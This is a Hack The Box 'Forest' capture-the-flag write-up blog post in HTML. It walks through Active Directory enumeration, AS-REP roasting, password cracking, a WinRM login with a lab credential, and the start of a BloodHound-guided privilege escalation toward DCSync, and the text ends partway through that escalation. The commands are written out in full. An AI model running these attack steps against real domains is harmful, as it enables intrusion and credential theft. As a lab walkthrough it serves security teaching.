@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Forest - Hack The Box</title>
+
+  <link rel="shortcut icon" href="/assets/images/favicon.ico">
+  <link rel="icon" href="/assets/iamges/favicon.ico" type="image/x-icon">
+  <link rel="icon" href="/assets/images/favicon.gif" type="image/gif">
+
+  <link rel="stylesheet" href="/assets/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Forest - Hack The Box | Filthy Hacker</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Forest - Hack The Box" />
+<meta name="author" content="Mateo Andino" />
+<meta property="og:locale" content="en" />
+<meta name="description" content="Today we are going to solve Hack The Box’s Forest machine. It is a Windows machine with a medium difficulty level for intrusion, and medium for privilege escalation as listed on the platform." />
+<meta property="og:description" content="Today we are going to solve Hack The Box’s Forest machine. It is a Windows machine with a medium difficulty level for intrusion, and medium for privilege escalation as listed on the platform." />
+<meta property="og:site_name" content="Filthy Hacker" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-08-19T00:00:00-04:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Forest - Hack The Box" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Mateo Andino","url":"https://mateonitro550.github.io"},"dateModified":"2024-08-19T00:00:00-04:00","datePublished":"2024-08-19T00:00:00-04:00","description":"Today we are going to solve Hack The Box’s Forest machine. It is a Windows machine with a medium difficulty level for intrusion, and medium for privilege escalation as listed on the platform.","headline":"Forest - Hack The Box","mainEntityOfPage":{"@type":"WebPage","@id":"/en/Forest-Hack-The-Box/"},"url":"/en/Forest-Hack-The-Box/"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+  <!-- Google Tag Manager -->
+  <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+  new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+  j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+  'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+  })(window,document,'script','dataLayer','GTM-PPKV9V8T');</script>
+  <!-- End Google Tag Manager -->
+
+</head>
+
+
+
+<body>
+
+  <!-- Google Tag Manager (noscript) -->
+  <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PPKV9V8T"
+  height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+  <!-- End Google Tag Manager (noscript) -->
+
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1 class="glitch-header">filthyHacker@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/en"><h2 class="header-link">Posts</h2></a>
+<a href="/en/search"><h2 class="header-link">Search</h2></a>
+<a href="/en/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/es"><h2 class="header-link">Español</h2></a>
+
+    </div>
+  </div>
+</header>
+
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>Forest - Hack The Box</h2>
+  <time datetime="2024-08-19T00:00:00-04:00" class="by-line">
+    
+      08/19/2024
+    
+  </time>
+  <p>Today we are going to solve <em>Hack The Box’s</em> <em>Forest</em> machine. It is a <em>Windows</em> machine with a medium difficulty level for intrusion, and medium for privilege escalation as listed on the platform.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/1.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<h3 id="reconnaissance-phase"><a href="#header-3"></a>Reconnaissance Phase</h3>
+
+<p>First, we’re going to launch an <em>ICMP traceroute</em> to check if the machine is active.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 10.10.10.161
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/2.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Once we verify that the machine is active (as it returns a response), we can also determine what type of machine we are dealing with based on the <em>TTL</em> value; in this case, the machine’s <em>TTL</em> value is <code class="language-plaintext highlighter-rouge">127</code>, so we can infer that we are dealing with a <em>Windows</em> machine. Remember, some of the reference values are as follows:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Operating System (OS)</th>
+      <th style="text-align: left">TTL</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">Linux</td>
+      <td style="text-align: left">64</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Windows</td>
+      <td style="text-align: left">128</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Solaris</td>
+      <td style="text-align: left">254</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>If we notice, in this case, the <em>TTL</em> value is <code class="language-plaintext highlighter-rouge">127</code> instead of <code class="language-plaintext highlighter-rouge">128</code> as indicated in the table above. This is because, in the <em>Hack The Box</em> environment, we are not communicating directly with the target machine; instead, there is an intermediary node, which causes the <em>TTL</em> to decrease by one unit.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 10.10.10.161 -R
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/3b.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Next, we will use the <em>Nmap</em> tool to determine which ports are open, as well as identify the version and services running on the asset. To determine which ports are open, we can do the following:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> 10.10.10.161
+</code></pre></div></div>
+
+<p>If the scan takes too long to complete, we have this alternative:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.161
+</code></pre></div></div>
+
+<p>Below is an explanation of the parameters used in the port scan with <em>Nmap</em>:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Parámetro</th>
+      <th style="text-align: left">Explicación</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">-p-</td>
+      <td style="text-align: left">Scans the entire range of ports (65535 in total)</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">--open</td>
+      <td style="text-align: left">Shows all ports that are open (or possibly open)</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-T5</td>
+      <td style="text-align: left">The timing template allows us to speed up our scan; this value can range from 0 to 5. Note that the higher the value of the template, the more “noise” we generate, but that’s okay, right? After all, we’re practicing in a controlled environment, and here we are all <code class="language-plaintext highlighter-rouge">White Hat</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-v</td>
+      <td style="text-align: left"><em>Verbose</em>, reports findings to the console</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-n</td>
+      <td style="text-align: left">Do not apply <em>DNS resolution</em></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-sS</td>
+      <td style="text-align: left"><em>TCP SYN</em> scan</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-min-rate</td>
+      <td style="text-align: left">Send packets no slower than &lt;value&gt; per second</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-vvv</td>
+      <td style="text-align: left">Triple <em>verbose</em>, to get more information in the console</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-Pn</td>
+      <td style="text-align: left">Do not apply <em>host discovery</em></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Once we have detected the open ports on the asset, we can move on to determine the version and services running on these ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p</span> 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49706,49957 10.10.10.161
+</code></pre></div></div>
+
+<p>Below is an explanation of the parameters used in the version and service scan with <em>Nmap</em>:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Parámetro</th>
+      <th style="text-align: left">Explicación</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">-sC</td>
+      <td style="text-align: left">Basic enumeration scripts</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-sV</td>
+      <td style="text-align: left">Version and services running on the found ports</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-p</td>
+      <td style="text-align: left">Specify which ports we want to analyze (those found open in the previous step)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Based on the information reported by <em>Nmap</em>, we can see that the target machine has open ports related to <code class="language-plaintext highlighter-rouge">DNS</code> (53), <code class="language-plaintext highlighter-rouge">Kerberos authentication</code> (88), <code class="language-plaintext highlighter-rouge">RPC</code> (135), <code class="language-plaintext highlighter-rouge">NetBIOS</code> (139), <code class="language-plaintext highlighter-rouge">LDAP</code> (389), <code class="language-plaintext highlighter-rouge">SMB</code> (445) and <code class="language-plaintext highlighter-rouge">WinRM</code> (5985). We can infer that we are dealing with a <em>Domain Controller (DC)</em> and we are in an <em>Active Directory (AD)</em> environment.</p>
+
+<h3 id="exploitation-phase"><a href="#header-3"></a>Exploitation Phase</h3>
+
+<p>The first thing we’ll do is check if the machine has network-shared resources via a <em>null session</em>, since we don’t have credentials; for this, we can use tools like <em>SMBMap</em> or <em>smbclient</em>. However, we won’t be able to list anything.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> 10.10.10.161
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/4.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-N</span> <span class="nt">-L</span> 10.10.10.161
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/5.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Next, we can try to enumerate the <code class="language-plaintext highlighter-rouge">LDAP</code> protocol to obtain information about users, groups, or other objects in the environment. To do this, we will use the <code class="language-plaintext highlighter-rouge">ldapsearch</code> tool.</p>
+
+<p>Our first goal will be to identify the <em>Naming Context</em>, which is the <em>Distinguished Name (DN)</em> that represents the highest level in the <em>Directory Information Tree (DIT)</em> and will serve as the base for our queries. We will use the following command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch <span class="nt">-x</span> <span class="nt">-h</span> 10.10.10.161 <span class="nt">-s</span> base namingcontexts
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/6.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>The <em>dn</em> field is empty because we are querying the base object of the directory. The <em>namingContexts</em> fields list the different <em>Naming Contexts</em> of the <em>LDAP</em> server. Each entry in <em>namingContexts</em> represents a different part of the <em>LDAP</em> directory that can be the base for various searches.</p>
+
+<p>We will use <code class="language-plaintext highlighter-rouge">DC=htb,DC=local</code> as the basis for our queries because this is the main <em>Naming Context</em> representing the <code class="language-plaintext highlighter-rouge">htb.local</code> domain, including users, groups, and other main objects. The other <em>Naming Contexts</em> (CN=Configuration, CN=Schema, DC=DomainDnsZones, DC=ForestDnsZones) are specific for configurations and schemas within the <em>AD</em> environment.</p>
+
+<p>Once we obtain the <em>DN</em>, we can start making specific queries, or we could list all the <em>LDAP</em> information with the following command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch <span class="nt">-x</span> <span class="nt">-h</span> 10.10.10.161 <span class="nt">-b</span> <span class="s2">"dc=htb,dc=local"</span>
+</code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Parámetro</th>
+      <th style="text-align: left">Explicación</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">-x</td>
+      <td style="text-align: left">Simple authentication</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-h</td>
+      <td style="text-align: left">Host</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-s</td>
+      <td style="text-align: left">Search scope</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-b</td>
+      <td style="text-align: left">Base DN for the search</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>We can start by searching for entries that contain the <em>user</em> object class to list system users.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch <span class="nt">-x</span> <span class="nt">-h</span> 10.10.10.161 <span class="nt">-b</span> <span class="s2">"dc=htb,dc=local"</span> <span class="s1">'(objectClass=user)'</span>
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/7.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>In the <em>sAMAccountName</em> fields of each user, we will find their respective usernames. With a potential list of users at our disposal, we might consider an <code class="language-plaintext highlighter-rouge">AS-REP Roasting</code> attack.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">AS-REP Roasting</code> attack exploits a weakness in <code class="language-plaintext highlighter-rouge">Kerberos</code> authentication in <em>Active Directory</em> environments. This attack begins by sending an <em>Authentication Server Request (AS-REQ)</em> message to the <em>DC</em> for users who are configured not to require <em>Kerberos</em> pre-authentication. If the user’s account is configured this way, the <em>DC</em> will respond with an <em>Authentication Server Response (AS-REP)</em> message, which contains a <em>Ticket Granting Ticket (TGT)</em> issued by the <em>Key Distribution Center (KDC)</em>. This <em>TGT</em> may be vulnerable to brute-force attacks if the password is weak, allowing us to crack the user’s password without having to perform a full authentication. This vulnerability is exploited because the server responds with an <em>AS-REP</em> message instead of rejecting the request due to the lack of pre-authentication.</p>
+
+<p>With this in mind, instead of searching for users manually one by one, we can use a one-liner to filter and parse the users directly.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/8.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>We can further refine the list of users obtained to focus exclusively on relevant accounts. The first two accounts, <em>DefaultAccount</em> and <em>Guest</em>, are created by the <em>AD</em> itself (although <em>Guest</em> is not enabled by default). Accounts ending in <em>$</em> are <em>computer accounts</em>, while the <em>$331000-VK4ADACQNUCA</em> account has an unusual format and could be a specialservice account or automatically generated. Accounts starting with <em>SM_</em> and <em>HealthMailbox</em> are related to the <em>Microsoft Exchange</em> service. This leaves us with five potential users for our analysis.</p>
+
+<p>The next thing we’ll do is use the <code class="language-plaintext highlighter-rouge">GetNPUsers</code> script from the <code class="language-plaintext highlighter-rouge">Impacket</code> suite. To run it, we need to provide the <em>AD</em> domain name we want to target. To set this up, we will edit the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file to ensure that the domain name resolves to the corresponding IP address of the server.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/9.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>With this done, the command we will use is the following:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-GetNPUsers htb.local/ <span class="nt">-no-pass</span> <span class="nt">-userfile</span> archivoListadoUsuarios 
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/10.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Interestingly, none of the users we obtained seem to be vulnerable to <code class="language-plaintext highlighter-rouge">AS-REP Roasting</code>. Therefore, we will proceed to enumerate another protocol identified during our <em>Nmap</em> scan, <code class="language-plaintext highlighter-rouge">RPC</code>.</p>
+
+<p>We will use <code class="language-plaintext highlighter-rouge">rpcclient</code>, again using a <em>null session</em>, as we don’t have credentials. We verify that we can connect successfully, so we will proceed to enumerate additional information. We could list domain groups using <em>enumdomgroup</em> or, alternatively, list domain users again using <em>enumdomusers</em>.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/11.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>We observe three new users that we hadn’t detected when enumerating with <em>ldapsearch</em>. We’re interested in <code class="language-plaintext highlighter-rouge">svc-alfresco</code>, as both Administrator and krbtgt are created by the <em>AD</em> itself.</p>
+
+<p>If we recall, when we used <em>ldapsearch</em>, we filtered for users whose object class contained <em>user</em>, and the five users we previously found meet this condition.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/12.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>However, upon further investigation, we discover that this “user” <code class="language-plaintext highlighter-rouge">svc-alfresco</code> does not have a defined object class. This is likely because it belongs to the <em>Organizational Unit (OU)</em> of Service Accounts.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/13.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Once again, by using a one-liner, we could filter and parse the users, refine the list, and use it with <code class="language-plaintext highlighter-rouge">Impacket</code> to check if this new user is vulnerable to <code class="language-plaintext highlighter-rouge">AS-REP Roasting</code>.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/14.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/15.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>We find that <code class="language-plaintext highlighter-rouge">svc-alfresco</code> is vulnerable to <code class="language-plaintext highlighter-rouge">AS-REP Roasting</code>, and we obtain a hash that we will attempt to crack by brute force using <code class="language-plaintext highlighter-rouge">John the Ripper</code> along with the <a href="https://github.com/brannondorsey/naive-hashcat/releases/tag/data">rockyou.txt</a> dictionary.</p>
+
+<p>If we don’t have <code class="language-plaintext highlighter-rouge">John the Ripper</code> installed, we can do the following:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>john
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john <span class="nt">--wordlist</span><span class="o">=</span>/path/to/rockyou.txt/dictionary/ <span class="nb">hash</span>
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/16.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Once we obtain the password for the <code class="language-plaintext highlighter-rouge">svc-alfresco</code> user, we can validate the credential before attempting to connect to the target machine to ensure it is correct. Recall that during our <em>Nmap</em> scan, we observed that the <code class="language-plaintext highlighter-rouge">WinRM</code> (<em>Windows Remote Management</em>) service is active on the target machine; this will be the protocol we will use for the connection.</p>
+
+<p>To validate the credential, we will use <em>CrackMapExec</em> with the following command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec winrm 10.10.10.161 <span class="nt">-u</span> <span class="s1">'svc-alfresco'</span> <span class="nt">-p</span> <span class="s1">'s3rvice'</span>
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/17.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>We realize that the credential is not only valid, but also that this user belongs to the <em>Remote Management Users</em> group,  as we see a message next to the username saying <em>Pwn3d!</em>. Therefore, we can connect to the target machine using <code class="language-plaintext highlighter-rouge">Evil-WinRM</code>.</p>
+
+<p>We will proceed to connect as follows:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.10.10.161 <span class="nt">-u</span> <span class="s1">'svc-alfresco'</span> <span class="nt">-p</span> <span class="s1">'s3rvice'</span>
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/18.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<h3 id="privilege-escalation"><a href="#header-3"></a>Privilege Escalation</h3>
+
+<p>Once inside the target machine, we can start gathering information from the <em>Active Directory</em> to allow us to escalate privileges. To do this, we will use <code class="language-plaintext highlighter-rouge">SharpHound</code>, a data collector for <code class="language-plaintext highlighter-rouge">BloodHound</code>, a tool that allows us to analyze and visualize relationships and permissions within an <em>Active Directory</em> environment to identify potential privilege escalation paths.</p>
+
+<p>The first thing we will do is download <a href="https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1">SharpHound</a> to our machine. One convenient feature of <code class="language-plaintext highlighter-rouge">Evil-WinRM</code> is that it allows us to easily upload and download files. To upload the <code class="language-plaintext highlighter-rouge">SharpHound.ps1</code> file to the target machine, we execute the following command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upload SharpHound.ps1
+</code></pre></div></div>
+
+<p>Once uploaded, we will import and use the <code class="language-plaintext highlighter-rouge">Invoke-BloodHound</code> function to collect all the necessary information.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\SharpHound.ps1</span><span class="w">
+</span><span class="n">Invoke-BloodHound</span><span class="w"> </span><span class="nt">-CollectionMethod</span><span class="w"> </span><span class="nx">All</span><span class="w">
+</span></code></pre></div></div>
+
+<p>This will generate a compressed file containing all the <em>AD</em> information. To download this file to our machine, we use the following command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>download &lt;timestamp&gt;_BloodHound.zip BloodHound.zip
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/19.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>The next step is to import the compressed file generated by <code class="language-plaintext highlighter-rouge">SharpHound</code> into <code class="language-plaintext highlighter-rouge">BloodHound</code>. If we don’t have the tool installed, we can do the following:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>neo4j bloodhound
+</code></pre></div></div>
+
+<p><em>Neo4j</em> is the graph database used by <code class="language-plaintext highlighter-rouge">BloodHound</code>. We will start it as follows:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>neo4j console
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/20.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>It will instruct us to navigate to <a href="http://localhost:7474/">http://localhost:7474/</a>. To connect to <em>Neo4j</em> for the first time, the default credentials we will enter are:</p>
+
+<ul>
+  <li>Username: neo4j</li>
+  <li>Password: neo4j</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/21.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>It will then prompt us to change the password, which we will use for <code class="language-plaintext highlighter-rouge">BloodHound</code>.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/22.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Once we open <code class="language-plaintext highlighter-rouge">BloodHound</code> and log in, on the right side, we will see a section labeled <em>Upload Data</em>. This is where we will upload our compressed file.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/23.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>In the search bar at the top left, we can search for the user we just compromised, <code class="language-plaintext highlighter-rouge">svc-alfresco</code>. We can right-click on it and select <em>Mark User as Owned</em>.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/24.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>If we go to the <em>Analysis</em> section, we will find a <em>Shortest Paths</em> section. Within this section, we select <em>Shortest Path from Owned Principals</em>. When we click, a graph will display showing the best path to become a system administrator.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/25.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>We can see that <code class="language-plaintext highlighter-rouge">svc-alfresco</code> is a member of the <em>Service Accounts</em> group, which is a member of the <em>Privileged IT Accounts</em> group, which in turn is a member of the <em>Account Operators</em> group. Additionally, the <em>Account Operators</em> group has <em>GenericAll</em> permissions over the <em>Exchange Windows Permissions</em> group, which grants it full control over this group. The <em>Exchange Windows Permissions</em> group has <em>WriteDacl</em> permissions over the domain, allowing it to modify the domain’s Discretionary Access Control List (<em>DACL</em>).</p>
+
+<p>Let’s break this down: the <em>Account Operators</em> group grants limited account creation privileges to a user. Therefore, the <code class="language-plaintext highlighter-rouge">svc-alfresco</code> user can create additional accounts in the domain. Additionally, the <em>Account Operators</em> group has <em>GenericAll</em> permissions over the <em>Exchange Windows Permissions</em> group, meaning <code class="language-plaintext highlighter-rouge">svc-alfresco</code> can modify the permissions of the <em>Exchange Windows Permissions</em> group. Finally, the <em>Exchange Windows Permissions</em> group has <em>WriteDacl</em> permissions over the domain. We will exploit this to grant ourselves <code class="language-plaintext highlighter-rouge">DCSync</code> privileges.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">DCSync</code> attack simulates the behavior of a <em>Domain Controller</em> and requests other <em>Domain Controllers</em> to replicate information using the Directory Replication Service Remote Protocol (<em>MS-DRSR</em>). Since this protocol is essential to <em>Active Directory’s</em> functionality, it cannot be disabled. By performing this attack, we can replicate domain information and dump all the domain hashes.</p>
+
+<p>With all this said, the first thing we will do is take advantage of <code class="language-plaintext highlighter-rouge">svc-alfresco</code> being a member of the <em>Account Operators</em> group and create a new user. To do this, we will use the following command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user username password /add /domain
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/26.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>The next step is to add the newly created user to the <em>Exchange Windows Permissions</em> group, taking advantage of the full control that <code class="language-plaintext highlighter-rouge">svc-alfresco</code> full control has over this group:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Add-ADGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"Exchange Windows Permissions"</span><span class="w"> </span><span class="nt">-Members</span><span class="w"> </span><span class="s2">"username"</span><span class="w">
+</span></code></pre></div></div>
+
+<p>We will also add this user to the <em>Remote Management Users</em> group so that it can connect via <code class="language-plaintext highlighter-rouge">Evil-WinRM</code>:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Add-ADGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"Remote Management Users"</span><span class="w"> </span><span class="nt">-Members</span><span class="w"> </span><span class="s2">"username"</span><span class="w">
+</span></code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/27.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>By adding the user to the <em>Remote Management Users</em> group, we avoid the use of <em>PSCredentials</em>, which are normally used to execute commands with another user’s credentials, which personally caused conflicts with <code class="language-plaintext highlighter-rouge">PowerView</code>.</p>
+
